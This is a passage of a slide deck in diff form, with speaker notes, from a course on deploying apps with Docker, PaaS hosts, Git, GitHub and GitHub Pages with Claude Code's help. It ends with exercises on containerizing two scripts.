+```
+:::
+:::
+
+::: {.explainer}
+The `.` tells Docker to build from the current folder. No API key is needed --- this app calls no model.
+:::
+
+::: {.notes}
+Here's a complete worked example, a tiny FastAPI app that asks for your name and replies with a hello greeting. On the left is the user's side: two commands, one to pull the image from Docker Hub and one to run it, then open the local address in a browser, type your name, and click the button. The user needs no Python and installs nothing except Docker. On the right is how it was built: the folder holds just three files, the Python file, the requirements file, and a Dockerfile, and the image was built with a single docker build command run inside that folder. The dot at the end of that command tells Docker to build from the current folder. And no API key is needed here, because this app calls no model.
+:::
+
+## Deployment
+
+You can deploy a container to a public URL using one of the PaaS (Platform as a Service) hosts Koyeb, Railway, Render, ...
+
+::: {.info-box}
+1. Create a free account
+2. New service → **Docker** → paste your Docker Hub image name
+3. Add environment variables (API keys, database credentials)
+4. Deploy → public URL in minutes
+:::
+
+::: {.explainer}
+After you create your account, Claude Code can do everything else.
+:::
+
+::: {.notes}
+Running on your laptop is fine for development, but you can also deploy a container to a public URL using a platform-as-a-service host like Koyeb, Railway, or Render. The process is short. Create a free account, start a new service, choose Docker, and paste in your Docker Hub image name. Add any environment variables the app needs, such as API keys or database credentials, and deploy; you get a public URL in minutes. And as the note at the bottom says, once you've created the account, Claude Code can do everything else for you.
+:::
+
+## Git and GitHub {.section-divider}
+
+::: {.notes}
+The last tools section covers Git and GitHub, which give you version control, backup, and another route to deployment.
+:::
+
+## Git
+
+Git is a **version control system** that tracks every change you make to your files. Every save is a commit — a snapshot you can return to at any time.
+
+::: {.three-cards}
+::: {.card-blue}
+[Install]{.card-title}
+
+Claude Code can install Git on your machine if it isn't already there.
+:::
+::: {.card-teal}
+[Commits]{.card-title}
+
+Claude Code can make commits for you on request. Every meaningful change gets saved with a description.
+:::
+::: {.card-purple}
+[History]{.card-title}
+
+Ask Claude Code to find when something changed, who changed it, or what the file looked like three versions ago.
+:::
+:::
+
+::: {.notes}
+Git is a version control system that tracks every change you make to your files. Every save is a commit, a snapshot you can return to at any time, and you might notice this is exactly the backup-and-version-control safeguard we listed earlier among the mitigations for destructive agent actions. The three cards show how little friction there is when you work with Claude Code. It can install Git on your machine if it isn't already there. It can make commits for you on request, so every meaningful change gets saved with a description. And it can search the history: ask it to find when something changed, who changed it, or what a file looked like three versions ago.
+:::
+
+## GitHub
+
+GitHub is a hosting service for Git repositories — your project lives in the cloud, backed up, and shareable.
+
+::: {.two-cards}
+::: {.card-blue}
+[Pushing]{.card-title}
+
+Once you create a free account at github.com, Claude Code can push your local repo to GitHub and push commits whenever you ask.  It uses the GitHub CLI. 
+:::
+::: {.card-amber}
+[Collaboration]{.card-title}
+
+Others can clone your repo, submit changes, and open issues. For solo work, GitHub is mainly backup + deployment: your code is always safe and always accessible.
+:::
+:::
+
+::: {.explainer}
+Claude Code can install the GitHub CLI and handle authentication. Tell it: "Push this project to a new GitHub repo."
+:::
+
+::: {.notes}
+GitHub is a hosting service for Git repositories: your project lives in the cloud, backed up and shareable. Once you create a free account, Claude Code can push your local repository to GitHub and push new commits whenever you ask; under the hood it uses the GitHub command-line tool. The collaboration side is there if you need it, since others can clone your repo, submit changes, and open issues. But for solo work, think of GitHub mainly as backup plus deployment: your code is always safe and always accessible. As the note says, Claude Code can install the GitHub CLI and handle authentication, so you can literally just tell it to push the project to a new GitHub repo.
+:::
+
+## GitHub Pages
+
+GitHub Pages turns any repository into a website — free, no server, no configuration.
+
+::: {.steps-list}
+1. Name your landing page `index.html`
+2. Push your repo to GitHub
+3. Go to Settings → Pages → set source to the `main` branch
+4. Your site is live at `yourusername.github.io/repo-name/`
+:::
+
+::: {.explainer}
+Claude can do all these steps for you.  This is only for static websites --- no backend server.  Pages can contain links and can run Pyodide apps.  It is simple to acquire a custom domain name (~$15 per year) and use it in place of the `github.io` URL.
+:::
+
+::: {.notes}
+GitHub Pages turns any repository into a website, free, with no server and no configuration. The steps are on the slide: name your landing page index dot html, push the repo to GitHub, then in the repository settings set the Pages source to the main branch, and your site is live at a github dot io address built from your username and the repo name. Claude can do all of these steps for you. Two caveats: this works only for static websites, there's no backend server, though pages can contain links and can run Pyodide apps. And if you want a nicer address, a custom domain costs about fifteen dollars a year and can be used in place of the github dot io URL.
+:::
+
+## App and Agent Deployment
+
+- Koyeb, Railway, Render can do **GitHub repo -> Docker container -> deploy**
+
+- You can skip all of the Docker steps!
+
+::: {.notes}
+Here's the payoff of combining the last two sections. The platform hosts we mentioned, Koyeb, Railway, and Render, can go directly from a GitHub repository to a Docker container to a deployed service. That means you can skip all of the Docker steps yourself. Push your code to GitHub, point the platform at the repo, and it handles the containerization and the deployment for you. So for many projects, GitHub plus one of these hosts is the entire path from code on your laptop to a running public app.
+:::
+
+## Practice {.section-divider}
+
+::: {.notes}
+That brings us to practice. The next slide has exercises for you to complete before our session.
+:::
+
+## Exercises
+
+**These exercises cannot be performed on the AI Lab**.
+
+1. Install Docker Desktop.  Thenb build and upload a container for `workover_rigs.py`.  Download and run the container to confirm it works.  
+
+2. Repeat for `northwind_agent.py`.  In this case, the user needs ANTHROPIC_API_KEY set in .env in the folder in which the [run]{.shell-cmd} command is executed.
+
+::: {.notes}
+These exercises are your pre-session work, so please complete them before we meet, and note the warning at the top: they cannot be performed on the AI Lab, so you'll need your own machine. First, install Docker Desktop, then build and upload a container for the workover rigs script. To confirm it really works, download and run the container yourself, just as another user would. Second, repeat the whole process for the Northwind agent script. That one calls a model, so whoever runs it needs an Anthropic API key set in a dot env file in the folder where the run command is executed. Working through these end to end, build, push, pull, run, will make everything in this session concrete.
+:::
+
